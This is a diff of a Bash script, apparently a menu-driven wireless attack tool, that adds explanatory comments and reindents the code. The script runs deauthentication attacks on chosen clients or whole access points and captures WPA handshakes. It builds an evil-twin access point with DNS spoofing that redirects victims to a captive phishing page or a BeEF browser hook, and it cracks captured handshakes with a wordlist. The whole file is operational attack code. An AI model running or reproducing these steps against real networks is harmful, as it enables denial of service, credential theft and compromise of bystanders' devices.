@@ -9,6 +9,8 @@ cat <<-_EOF_
 ###########################################################################                                                                 
 	_EOF_
 sleep 1
+
+# Section defines variables and create file paths to ensure directories are properly filled.
 NULL=>/dev/null
 INDEX=index.html
 ROGUE=Rogue_AP.zip
@@ -20,7 +22,7 @@ DELAY=3
 MON=mon 
 service apache2 stop 2&$NULL
 gunzip /usr/share/wordlists/rockyou.txt.gz $NULL
-echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/ip_forward 				# Allows for internet access on setup AP
 mkdir ~/Handshakes/ $NULL
 mkdir /etc/beef/ $NULL
 mkdir /var/ $NULL
@@ -29,6 +31,7 @@ mkdir /var/www/html $NULL
 clear
 ##################################################################################################
 
+# Section displays user ip then asks for ip-input, checks if user is running program as root, then installs needed packages and updates system.
 ifconfig eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1
 read -p "${yellow}Enter your IP :${resetColor} " IPADDRESS # Make this auto fill 
 clear
@@ -43,6 +46,7 @@ fi
 read -p "${red}Is it okay if I install what the script needs to run and update your system? [y/n]${resetColor} : " RUN
 if [ $RUN == y ]; then
 	apt update -y
+	#apt upgrade -y
 	apt install dnsmasq -y
 	apt install macchanger -y 
 	apt install dsniff -y
@@ -51,13 +55,19 @@ if [ $RUN == y ]; then
 	clear
 fi
 
+##################################################################################################
+
+# Section adds lines to end of NetworkManager.conf these lines stop the airmon + network manager conflict
 read -p "${red}This is important to ensure I don't overwrite your files, Have you ran this script before? [y/n]${resetColor} : " NETWORKMGR
 	if [ $NETWORKMGR == n ] ; then
 		echo "" >> /etc/NetworkManager/NetworkManager.conf
 		echo "[keyfile]
-unmanaged-devices:mac=AA:BB:CC:DD:EE:FF" >> /etc/NetworkManager/NetworkManager.conf 
+        unmanaged-devices:mac=AA:BB:CC:DD:EE:FF" >> /etc/NetworkManager/NetworkManager.conf 
 	fi
 	
+##################################################################################################
+
+# Section determines if the html packages are required, an ngrok code is required at this time, webserver on lan is hosting the files.
 read -p "${red}Are you installing this with an ngrok code[y] or through lan[n]? Leave blank if you don't need the html files : ${resetColor}" HTML
 
 	if [ $HTML == n ] ; then
@@ -95,6 +105,8 @@ echo "${green}Setup is complete"
 clear
 
 ##################################################################################################
+
+# Section allows user to select the interface they wish to put into monitor mode, this allows for packet capture and injection. The mac address is then changed to the same as the lines added to networkmanager.conf
 iwconfig 
 read -p " Which interface do you wish to use?${resetColor} : " INTERFACE # find way to limit output to just devices
 echo "Changing MAC ... "
@@ -104,6 +116,9 @@ echo "Changing MAC ... "
 	ifconfig $INTERFACE up
 	sleep 2
 clear
+##################################################################################################
+
+# Section promts user for menu selection 
 
 while [[ $(id -u) == 0 ]] ; do
 	clear
@@ -120,225 +135,241 @@ while [[ $(id -u) == 0 ]] ; do
 	_EOF_
 
 	read -p "${green}Please select an option from the list ${resetColor}: " CHOICE 	
-if [[ "$CHOICE" =~ ^[1-7]$ ]]; then
+	if [[ "$CHOICE" =~ ^[1-7]$ ]]; then 															# Validates range of number to ensure program runs 1-7 
 
 ##################################################################################################
 
-	if [[ $CHOICE == 1 ]] ; then
-	echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
-	ifconfig $INTERFACE up 
-	airmon-ng start $INTERFACE $NULL
-	clear
-	echo "I'm about to show you all the nearby access points, make sure it runs for 10-15 seconds and you copy the bssid and the channel you want to attack."
-	sleep 5   
-	airodump-ng $INTERFACE$MON 
-	read -p "${yellow} Enter your target's bssid here ${resetColor} : " BSSID
-	read -p "${yellow} Enter your target's channel here ${resetColor} : " CHANNEL
-	echo "I'm about to show you the devices on the specified network, make sure you ${red}LEAVE THIS OPEN${resetColor} and you copy the bssid and the station [Device] you want to attack."
-	sleep $DELAY 
-	echo " ${yellow} Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	echo "${green} Storing the .cap file in the Handshakes Directory ${resetColor} "
-	gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL -w ~/Handshakes/handshake
-	read -p "${yellow} Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
-	read -p "${yellow} Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
-	echo "${red} Now sending deauth packets ${resetColor} ... "
-	gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON
-	fi
+# Section makes sure the chosen interface is up, starts monitor mode on that device, displays all nearby access points and a few bits of information on the target 
+
+		if [[ $CHOICE == 1 ]] ; then
+			echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
+			ifconfig $INTERFACE up 
+			airmon-ng start $INTERFACE $NULL
+			clear
+			echo "I'm about to show you all the nearby access points, make sure it runs for 10-15 seconds and you copy the bssid and the channel you want to attack."
+			sleep 5   
+			airodump-ng $INTERFACE$MON 
+			read -p "${yellow} Enter your target's bssid here ${resetColor} : " BSSID 
+			read -p "${yellow} Enter your target's channel here ${resetColor} : " CHANNEL
+			echo "I'm about to show you the devices on the specified network, make sure you ${red}LEAVE THIS OPEN${resetColor} and you copy the bssid and the station [Device] you want to attack."
+			sleep $DELAY 
+			echo " ${yellow} Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
+			echo "${green} Storing the .cap file in the Handshakes Directory ${resetColor} "
+			gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL -w ~/Handshakes/handshake			# Opens in a new window the process that will be used to capture the 3 way handshake when the user attempts to reconnect the the access point. Writes to handshake file
+			read -p "${yellow} Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
+			read -p "${yellow} Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
+			echo "${red} Now sending deauth packets ${resetColor} ... "
+			gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON										# In new terminal deauths the selected client by sending the coresponding packets  
+		fi
 
 ##################################################################################################
 
-	if [[ $CHOICE == 2 ]] ; then
-	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
-	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE 
-	clear
-	echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
-	sleep 5   
-	airodump-ng $INTERFACE$MON 
-	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
-	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
-	echo "I'm about to show you the devices on the specified network, LEAVE THIS OPEN"
-	sleep 5 
-	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 
-	read -p "${yellow}Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
-	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
-	echo "${red}Now sending deauth packets ${resetColor} ... "
-	airplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON
-	fi
+# Section is similar to the above, doesn't capture the handshake, useful to just quickly deauth a client 
+
+		if [[ $CHOICE == 2 ]] ; then
+			echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
+			ifconfig $INTERFACE up
+			airmon-ng start $INTERFACE 
+			clear
+			echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
+			sleep 5   
+			airodump-ng $INTERFACE$MON 
+			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
+			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
+			echo "I'm about to show you the devices on the specified network, LEAVE THIS OPEN"
+			sleep 5 
+			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
+			gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 
+			read -p "${yellow}Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
+			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
+			echo "${red}Now sending deauth packets ${resetColor} ... "
+			airplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON
+		fi
 
 ##################################################################################################	
 
-	if [[ $CHOICE == 3 ]] ; then
-	echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
-	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE $NULL
-	clear
-	echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
-	sleep 5   
-	airodump-ng $INTERFACE$MON 
-	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
-	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
-	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 					
-	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
-	echo "${red}Now sending deauth packets ${resetColor} ... "
-	aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
-	fi
+# Section is similar to option 1, doesn't capture the handshake, but will deauth a whole access point 
+
+		if [[ $CHOICE == 3 ]] ; then
+			echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
+			ifconfig $INTERFACE up
+			airmon-ng start $INTERFACE $NULL
+			clear
+			echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
+			sleep 5   
+			airodump-ng $INTERFACE$MON 
+			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
+			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
+			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
+			gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 					
+			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
+			echo "${red}Now sending deauth packets ${resetColor} ... "
+			aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
+		fi
 
  ##################################################################################################
 
-	if [[ $CHOICE == 4 ]] ; then
-	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
-	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE $NULL
-	clear
-	echo "Setting up your dnsmasq.conf ... "
-	echo "interface=at0
-dhcp-range=10.0.0.10,10.0.0.250,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-server=8.8.8.8
-address=/#/$IPADDRESS
-log-queries
-log-dhcp
-listen-address=127.0.0.1 " > /bin/dnsmasq.conf 
-	sleep 1
-	echo "Optimizing your access point ... "
-	ifconfig $INTERFACE$MON down 
-	iw reg set US
-	ifconfig $INTERFACE$MON up 
-	echo "${yellow}Setting up python server for captive AP in another tab${resetColor}"
-	cd /var/www/html/Rogue_AP
-	sleep 1
-	gnome-terminal -x python3 -m http.server 80
-	sleep $DELAY
-	clear
-	echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
-	sleep 5   
-	airodump-ng $INTERFACE$MON 
-	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
-	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
-	read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
-	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
-	sleep 5 
-	gnome-terminal -x ifconfig at0 10.0.0.1 up 
+# Section will create a file in the /bin/ directory with the contents needed to setup a range of IP's for the client when they connect to the evil-twin network.
+# Then will remove power restrictions based on region on the wifi adapter to ensure the signal is strong.
+
+		if [[ $CHOICE == 4 ]] ; then
+			echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
+			ifconfig $INTERFACE up
+			airmon-ng start $INTERFACE $NULL
+			clear
+			echo "Setting up your dnsmasq.conf ... "
+			echo "interface=at0
+            dhcp-range=10.0.0.10,10.0.0.250,12h
+            dhcp-option=3,10.0.0.1
+            dhcp-option=6,10.0.0.1
+            server=8.8.8.8
+            address=/#/$IPADDRESS
+            log-queries
+            log-dhcp
+            listen-address=127.0.0.1 " > /bin/dnsmasq.conf 
+			sleep 1
+			echo "Optimizing your access point ... "
+			ifconfig $INTERFACE$MON down 
+			iw reg set US
+			ifconfig $INTERFACE$MON up 
+			echo "${yellow}Setting up python server for captive AP in another tab${resetColor}"
+			cd /var/www/html/Rogue_AP
+			sleep 1
+			gnome-terminal -x python3 -m http.server 80														# Apache ran into conflicts, python3 server is used to host files in new terminal
+			sleep $DELAY
+			clear
+			echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
+			sleep 5   
+			airodump-ng $INTERFACE$MON 
+			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
+			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
+			read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
+			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
+			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON				# starts evil-twin accesspoint, with the user provided information 
+			sleep 5 
+			gnome-terminal -x ifconfig at0 10.0.0.1 up 														# airbase will create network device 'at0' this line brings up the interface and acts as the gateway for the client when they connnect
 			
-	echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"
-	sleep $DELAY
-		if [[ 1 == 1 ]] ; then
-		iptables --flush
-		iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
-		iptables --append FORWARD --in-interface at0 -j ACCEPT 
-		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
-		iptables -t nat -A POSTROUTING -j MASQUERADE
-		fi	
-	echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
-	sleep 5
-	gnome-terminal -x dnsmasq -C /bin/dnsmasq.conf -d 	# -C for configuration and -d for daemon (background) mode 
+			echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"								# iptables rules are configured to allow internet access to the connected client, allowing traffic in through at0 and out through eth0
+			sleep $DELAY
+			if [[ 1 == 1 ]] ; then																	
+				iptables --flush
+				iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
+				iptables --append FORWARD --in-interface at0 -j ACCEPT 
+				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 		# routes traffic to gateway 
+				iptables -t nat -A POSTROUTING -j MASQUERADE												# masquerade creates a nat under the 10.0.0.1 subnet 
+			fi	
+			echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
+			sleep 5
+			gnome-terminal -x dnsmasq -C /bin/dnsmasq.conf -d 	# -C for loading configuration and -d for daemon mode 
 					
-	#service mysql start 					# Needs fix								
-  	sleep $DELAY
-  	echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
-  	gnome-terminal -x dnsspoof -i at0	
-  	clear			
-	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
-	echo "${red}Now sending deauth packets ${resetColor} ... "
-	gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
+			#service mysql start 					# Needs fix								
+  			sleep $DELAY
+  			echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
+  			gnome-terminal -x dnsspoof -i at0																# opens another terminal, dnsspoof pointed to the at0 interface will redirect traffic to our Rougue_AP directory in our python server, as soon as the client loads their browser, emulating a public wifi network you have to sign into.
+  			clear			
+			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
+			echo "${red}Now sending deauth packets ${resetColor} ... "
+			gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
 
-	fi
-
-##################################################################################################
-
-	if [[ $CHOICE == 5 ]] ; then
-	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
-	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE $NULL
-	clear
-	echo "Setting up dnsmasq.conf ... "
-	echo "interface=at0
-dhcp-range=10.0.0.10,10.0.0.250,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-server=8.8.8.8
-address=/#/$IPADDRESS
-log-queries
-log-dhcp
-listen-address=127.0.0.1 " > /etc/beef/dnsmasq.conf # add this to both beef and captive portal to seperate file paths 
-	sleep 1
-	echo "${yellow}Setting up python server for the hooked browser in another tab${resetColor}"
-	cd /var/www/html/
-	sleep 1
-	gnome-terminal -x python3 -m http.server 80
-	echo "Optimizing your access point ... "
-	ifconfig $INTERFACE$MON down 
-	iw reg set US
-	ifconfig $INTERFACE$MON up 
-	sleep $DELAY
-	clear
-	echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
-	sleep 5   
-	airodump-ng $INTERFACE$MON 
-	read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
-	read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
-	read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
-	echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
-	gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
-	sleep 5 
-	gnome-terminal -x ifconfig at0 10.0.0.1 up 
-			
-	echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"
-	sleep $DELAY
-		if [[ 1 == 1 ]] ; then
-		iptables --flush
-		iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
-		iptables --append FORWARD --in-interface at0 -j ACCEPT 
-		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
-		iptables -t nat -A POSTROUTING -j MASQUERADE
 		fi
-	echo "${yellow}Setting up beef-xss now, it will open a web-console ...${resetColor}"
-	beef-xss	
-	echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
-	sleep 5
-	gnome-terminal -x dnsmasq -C /etc/beef/dnsmasq.conf -d 	# -C for configuration and -d for daemon (background) mode  										
-  	sleep $DELAY
-  	echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
-  	gnome-terminal -x dnsspoof -i at0	
-  	clear			
-	read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
-	echo "${red}Now sending deauth packets ${resetColor} ... "
-	gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
-	fi
 
 ##################################################################################################
 
-if [[ $CHOICE == 6 ]] ; then
-	clear
-	read -p "${yellow}Which handshake file do you want to use? [ex: 1] : ${resetColor}" HANDSHAKENUM
-	if [[ "$HANDSHAKENUM" =~ ^[1-100]$ ]]; then
-		echo "${green}Setting up the password crack, check your ~/Handshakes/ directory for the results ${resetColor}"
-		sleep $DELAY
-		aircrack-ng ~/Handshakes/handshake-0$HANDSHAKENUM.cap -w /usr/share/wordlists/rockyou.txt > ~/Handshakes/results
-	fi
-fi
+# Section is almost identical to last, instead of a captive portal, redirects client to our index.html page which is a hooked webpage [beef] upon browser startup.
+# Hooked browser will allow attacker to execute commands on the device as long as the user is on the webpage, uses a xss technique. Attack timing must be fast.
+
+		if [[ $CHOICE == 5 ]] ; then
+			echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
+			ifconfig $INTERFACE up
+			airmon-ng start $INTERFACE $NULL
+			clear
+			echo "Setting up dnsmasq.conf ... "
+			echo "interface=at0
+            dhcp-range=10.0.0.10,10.0.0.250,12h
+            dhcp-option=3,10.0.0.1
+            dhcp-option=6,10.0.0.1
+            server=8.8.8.8
+            address=/#/$IPADDRESS
+            log-queries
+            log-dhcp
+            listen-address=127.0.0.1 " > /etc/beef/dnsmasq.conf 
+	        sleep 1
+	        echo "${yellow}Setting up python server for the hooked browser in another tab${resetColor}"
+			cd /var/www/html/
+			sleep 1
+			gnome-terminal -x python3 -m http.server 80
+			echo "Optimizing your access point ... "
+			ifconfig $INTERFACE$MON down 
+			iw reg set US
+			ifconfig $INTERFACE$MON up 
+			sleep $DELAY
+			clear
+			echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
+			sleep 5   
+			airodump-ng $INTERFACE$MON 
+			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
+			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
+			read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
+			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
+			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL $INTERFACE$MON
+			sleep 5 
+			gnome-terminal -x ifconfig at0 10.0.0.1 up 
+			
+			echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"
+			sleep $DELAY
+			if [[ 1 == 1 ]] ; then
+				iptables --flush
+				iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
+				iptables --append FORWARD --in-interface at0 -j ACCEPT 
+				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
+				iptables -t nat -A POSTROUTING -j MASQUERADE
+			fi
+			echo "${yellow}Setting up beef-xss now, it will open a web-console ...${resetColor}"				# opens webgui, if first time user will prompt for new password
+			beef-xss	
+			echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
+			sleep 5
+			gnome-terminal -x dnsmasq -C /etc/beef/dnsmasq.conf -d 	# -C for configuration and -d for daemon (background) mode  										
+  			sleep $DELAY
+  			echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
+  			gnome-terminal -x dnsspoof -i at0	
+  			clear			
+			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
+			echo "${red}Now sending deauth packets ${resetColor} ... "
+			gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
+		fi
+
+##################################################################################################
+
+# Section will (if possible) crack a password using a handshake.cap file chosen by the user as well as the rockyou.txt password file  
+
+		if [[ $CHOICE == 6 ]] ; then
+			clear
+			read -p "${yellow}Which handshake file do you want to use? [ex: 1] : ${resetColor}" HANDSHAKENUM
+			if [[ "$HANDSHAKENUM" =~ ^[1-100]$ ]]; then
+				echo "${green}Setting up the password crack, check your ~/Handshakes/ directory for the results ${resetColor}"
+				sleep $DELAY
+				aircrack-ng ~/Handshakes/handshake-0$HANDSHAKENUM.cap -w /usr/share/wordlists/rockyou.txt > ~/Handshakes/results 
+			fi
+		fi
 	
 ##################################################################################################
 
-	if [[ $CHOICE == 7 ]] ; then 
-	echo "Cleaning up ... "
-	airmon-ng stop $INTERFACE$MON $NULL
-	ifconfig $INTERFACE up $NULL
-	service network-manager restart
-	iptables --flush
-	sleep 1
-	read -p "${red}Do you want me to purge your existing handshakes and cracked passwords results? [y/n]? : ${resetColor}" PURGE
-		if [[ $PURGE == y ]] ; then 
-			rm -r ~/Handshakes/
-		
-		fi
-	exit
-	fi
+# Section reverts the changes made to the network adapter that was put into monitor mode, restarts network manager, flushes iptables and prompts user to purge the handshakes directory as it clutters fast.
 
-fi
+		if [[ $CHOICE == 7 ]] ; then 
+			echo "Cleaning up ... "
+			airmon-ng stop $INTERFACE$MON $NULL
+			ifconfig $INTERFACE up $NULL
+			service network-manager restart
+			iptables --flush
+			sleep 1
+			read -p "${red}Do you want me to purge your existing handshakes and cracked passwords results? [y/n]? : ${resetColor}" PURGE
+			if [[ $PURGE == y ]] ; then 
+				rm -r ~/Handshakes/
+		
+			fi
+			exit
+		fi
+
+	fi
 done
